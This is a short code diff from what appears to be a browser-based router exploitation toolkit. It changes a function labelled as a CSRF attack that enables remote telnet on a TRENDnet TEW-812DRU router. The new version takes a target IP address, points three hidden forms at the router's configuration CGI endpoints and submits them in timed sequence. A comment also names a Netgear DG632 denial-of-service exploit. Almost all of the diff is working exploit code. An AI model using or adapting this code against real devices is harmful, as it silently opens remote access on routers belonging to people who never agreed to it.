@@ -1642,10 +1642,14 @@ String.prototype.toHex = function() {
 };
 
 // TRENDnet TEW 812DRU CSRF Enable remote telnet
-function trend23pwn(){
-document.t231.submit();
-setTimeout(function() {document.t232.submit();},3000);
-setTimeout(function() {document.t233.submit();},6000);
+function trend23pwn(ip){
+	ip = ip || "192.168.10.1";
+	document.t231.action="http://" + ip + "/uapply.cgi";
+	document.t232.action="http://" + ip + "/setNTP.cgi";
+	document.t233.action="http://" + ip + "/setNTP.cgi";
+	document.t231.submit();
+	setTimeout(function() {document.t232.submit();},3000);
+	setTimeout(function() {document.t233.submit();},6000);
 }
 
 // Netgear DG632 'firmwarecfg' denial of service
